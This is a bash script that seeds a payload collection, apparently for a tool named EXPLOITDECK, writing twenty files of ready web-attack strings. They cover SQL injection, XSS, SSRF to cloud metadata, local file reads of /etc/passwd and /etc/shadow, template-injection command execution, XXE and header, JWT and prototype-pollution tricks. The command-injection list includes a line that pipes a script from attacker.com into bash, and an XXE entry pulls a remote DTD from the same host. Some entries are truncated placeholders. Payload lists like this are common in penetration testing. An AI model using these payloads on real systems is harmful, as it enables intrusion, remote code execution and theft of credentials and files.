#!/bin/bash
# seed_manual.sh - Manual high-quality data injection for EXPLOITDECK

DATA_DIR="data"
mkdir -p "$DATA_DIR"

echo "[*] Injecting premium seed data into 20 categories..."

# 1. SQLi
cat <<EOF > "${DATA_DIR}/sqli.txt"
' OR 1=1--
' OR '1'='1
admin' --
admin' #
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT @@version,NULL,NULL--
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
' OR 1=1 LIMIT 1--
") OR 1=1--
' OR 1=1#
EOF

# 2. XSS
cat <<EOF > "${DATA_DIR}/xss.txt"
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
javascript:alert(1)
'"><script>alert(1)</script>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
EOF

# 3. SSRF
cat <<EOF > "${DATA_DIR}/ssrf.txt"
http://169.254.169.254/latest/meta-data/
http://localhost:80
http://127.0.0.1:22
http://metadata.google.internal/computeMetadata/v1/
http://instance-data/latest/meta-data/
gopher://localhost:11211/_stats
dict://localhost:11211/stat
file:///etc/passwd
http://169.254.169.254/latest/user-data
http://10.0.0.1/admin
EOF

# 4. LFI
cat <<EOF > "${DATA_DIR}/lfi.txt"
../../../../etc/passwd
../../../../etc/shadow
/etc/passwd
/windows/win.ini
../../../../windows/system32/drivers/etc/hosts
/proc/self/environ
/var/log/apache2/access.log
php://filter/convert.base64-encode/resource=index.php
../../../../etc/group
/proc/self/cmdline
EOF

# 5. SSTI
cat <<'EOF' > "${DATA_DIR}/ssti.txt"
{{7*7}}
${7*7}
\${7*7}
<%= 7*7 %>
#{7*7}
[[7*7]]
{{self}}
{{config.items()}}
${"z".join(["a","b"])}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
EOF

# 6. RCE
cat <<EOF > "${DATA_DIR}/rce.txt"
; id;
| whoami
\`id\`
\$(id)
; curl http://attacker.com/shell.sh | bash
& id &
; sleep 10;
| ping -c 10 127.0.0.1
; uname -a;
; cat /etc/passwd;
EOF

# 7. XXE
cat <<EOF > "${DATA_DIR}/xxe.txt"
<!DOCTYPE replace [<!ENTITY ent "hacked"> ]><root>&ent;</root>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>
<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">%eval;%error;
EOF

# 8. Redirect
cat <<EOF > "${DATA_DIR}/redirect.txt"
//google.com
https://google.com
/\\google.com
/%2f%2fgoogle.com
/%5c%5cgoogle.com
javascript:void(location.href='https://google.com')
EOF

# 9. NoSQL
cat <<EOF > "${DATA_DIR}/nosql.txt"
{"\$gt": ""}
{"\$ne": null}
{"\$where": "this.password.length > 0"}
' || '1'=='1
true, \$where: '1 == 1'
EOF

# 10. LDAP
cat <<EOF > "${DATA_DIR}/ldap.txt"
*
)(cn=*)
*)(&
(uid=*)
)(|(&(uid=*))
EOF

# 11. Headers
cat <<EOF > "${DATA_DIR}/headers.txt"
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
Host: attacker.com
X-Forwarded-Host: attacker.com
Forwarded: for=127.0.0.1;host=attacker.com
EOF

# 12. JWT
cat <<EOF > "${DATA_DIR}/jwt.txt"
eyjhbgcioijsuzi1nij9.eyjzdwiioijhzg1pbiisimlhdcixntexndk0mziyfq.
{"alg":"none","typ":"JWT"}
{"alg":"HS256","typ":"JWT"}
bearer eyj...
EOF

# 13. CRLF
cat <<EOF > "${DATA_DIR}/crlf.txt"
%0d%0aSet-Cookie:session=hacked
%0aSet-Cookie:session=hacked
\r\nLocation: http://google.com
%0d%0aContent-Length: 0
EOF

# 14. GraphQL
cat <<EOF > "${DATA_DIR}/graphql.txt"
{__schema{types{name,fields{name}}}}
query { __typename }
mutation { ... }
fragment on ...
EOF

# 15. CORS
cat <<EOF > "${DATA_DIR}/cors.txt"
Origin: https://attacker.com
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
EOF

# 16. Deserialization
cat <<EOF > "${DATA_DIR}/deserial.txt"
rO0AB...
aced0005...
O:8:"stdClass":0:{}
a:2:{i:0;s:4:"test";i:1;s:4:"data";}
EOF

# 17. Pollution
cat <<EOF > "${DATA_DIR}/pollution.txt"
__proto__[test]=test
constructor.prototype.test=test
{"__proto__": {"admin": true}}
EOF

# 18. Cloud
cat <<EOF > "${DATA_DIR}/cloud.txt"
169.254.169.254
metadata.google.internal
instance-data.ec2.internal
s3://bucket-name/
EOF

# 19. WordPress
cat <<EOF > "${DATA_DIR}/wordpress.txt"
/wp-config.php
/wp-admin/
/wp-login.php
/xmlrpc.php
/wp-content/debug.log
EOF

# 20. Encoding
cat <<EOF > "${DATA_DIR}/encoding.txt"
%2e%2e%2f
%252e%252e%252f
0x41414141
&#x41;&#x41;
\u0041\u0041
EOF

# Update Meta
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
cat <<EOF > "${DATA_DIR}/meta.json"
{
  "last_updated": "$TIMESTAMP",
  "total_payloads": 200,
  "repos_crawled": 90
}
EOF

echo "[+] Seeding complete. All 20 files populated."
